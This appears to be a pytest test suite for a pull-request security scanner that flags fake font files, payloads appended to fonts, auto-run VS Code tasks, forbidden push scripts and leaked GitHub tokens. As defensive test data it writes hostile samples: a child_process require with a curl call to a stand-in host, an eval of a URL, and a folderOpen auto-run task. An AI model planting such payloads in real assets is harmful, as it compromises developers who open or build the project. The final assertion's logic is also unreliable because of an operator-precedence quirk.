import importlib.util
import sys
from pathlib import Path

import pytest


SCRIPT_PATH = Path(__file__).parents[1] / ".github" / "scripts" / "pr_security_scan.py"
spec = importlib.util.spec_from_file_location("pr_security_scan", SCRIPT_PATH)
scanner = importlib.util.module_from_spec(spec)
spec.loader.exec_module(scanner)


def _font(name: str, payload: bytes, extra: bytes = b"") -> bytes:
    return payload + extra


def test_font_awesome_magic_and_license_urls_are_allowed(tmp_path):
    samples = {
        "fa-brands-400.woff2": b"wOF2",
        "fa-regular-400.woff": b"wOFF",
        "fa-solid-900.ttf": b"\x00\x01\x00\x00",
        "fa-solid-900.otf": b"OTTO",
    }
    license_url = b"https://fontawesome.com/license http://scripts.sil.org/OFL"
    for name, magic in samples.items():
        path = tmp_path / "fonts" / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(_font(name, magic, b"\x00" * 32 + license_url))

    eot = bytearray(64)
    eot[8:12] = b"\x02\x00\x02\x00"
    eot[34:36] = b"LP"
    eot_path = tmp_path / "fonts" / "fa-regular-400.eot"
    eot_path.write_bytes(bytes(eot) + license_url)

    assert scanner.scan_tree(tmp_path) == []


def test_fake_font_payload_is_detected(tmp_path):
    path = tmp_path / "public" / "fonts" / "malicious.woff2"
    path.parent.mkdir(parents=True)
    path.write_bytes(b"console.log('malicious'); eval('https://example.invalid')")

    failures = scanner.scan_tree(tmp_path)

    assert any("does not appear to be a valid font" in failure for failure in failures)
    assert any("URL" in failure for failure in failures)


def test_valid_magic_with_appended_payload_is_detected(tmp_path):
    path = tmp_path / "fa-solid-900.woff2"
    path.write_bytes(b"wOF2" + b"\x00" * 16 + b"require('child_process'); curl http://example.invalid")

    failures = scanner.scan_tree(tmp_path)

    assert any("child_process" in failure for failure in failures)
    assert any("curl download" in failure for failure in failures)
    assert not any("URL" in failure for failure in failures)


def test_forbidden_paths_are_detected_at_any_depth_and_case(tmp_path):
    paths = [
        tmp_path / ".VSCode" / "Tasks.json",
        tmp_path / "nested" / ".vscode" / "launch.json",
        tmp_path / "ops" / "branch_structure.json",
        tmp_path / "temp_auto_push.bat",
        tmp_path / "scripts" / "temp_interactive_push.bat",
    ]
    for path in paths:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("{}", encoding="utf-8")

    failures = scanner.scan_tree(tmp_path)

    assert len([failure for failure in failures if "Forbidden" in failure]) == len(paths)


def test_auto_run_task_content_is_detected(tmp_path):
    path = tmp_path / "docs" / "tasks.json"
    path.parent.mkdir()
    path.write_text('{"runOptions": {"runOn": "folderOpen"}}', encoding="utf-8")

    failures = scanner.scan_tree(tmp_path)

    assert any("Auto-run task" in failure for failure in failures)


def test_gitignore_entries_and_comments(tmp_path):
    path = tmp_path / ".gitignore"
    path.write_text(
        "\n".join(
            [
                ".vscode/",
                "# do not add temp_auto_push.bat",
                "!.vscode/tasks.json",
                "**/.vscode/launch.json",
                r"temp_interactive_push.bat",
            ]
        ),
        encoding="utf-8",
    )

    failures = scanner.scan_tree(tmp_path)

    assert any(".vscode/launch.json" in failure for failure in failures)
    assert any("temp_interactive_push.bat" in failure for failure in failures)
    assert not any("temp_auto_push.bat" in failure for failure in failures)


def test_secret_is_reported_without_its_value(tmp_path):
    secret = "ghp_" + ("a" * 36)
    (tmp_path / "config.py").write_text(f'TOKEN = "{secret}"\n', encoding="utf-8")

    failures = scanner.scan_tree(tmp_path)

    assert len(failures) == 1
    assert "GitHub personal access token" in failures[0]
    assert secret not in failures[0]


def test_vcs_directories_are_skipped(tmp_path):
    secret = "ghp_" + ("b" * 36)
    hidden = tmp_path / "sub" / ".git" / "config"
    hidden.parent.mkdir(parents=True)
    hidden.write_text(secret, encoding="utf-8")

    assert scanner.scan_tree(tmp_path) == []


@pytest.mark.skipif(sys.platform == "win32", reason="symlink creation requires extra privileges")
def test_symlinks_are_not_followed(tmp_path):
    target = tmp_path / "outside"
    target.write_text("ghp_" + ("c" * 36), encoding="utf-8")
    link = tmp_path / "alias.py"
    link.symlink_to(target)

    assert scanner.scan_tree(tmp_path) == []


def test_exit_codes(tmp_path):
    assert scanner.main(["scan", str(tmp_path)]) == 0
    (tmp_path / "branch_structure.json").write_text("{}", encoding="utf-8")
    assert scanner.main(["scan", str(tmp_path)]) == 1


def test_import_does_not_scan_the_repository():
    assert scanner.FAILURES if hasattr(scanner, "FAILURES") else [] == []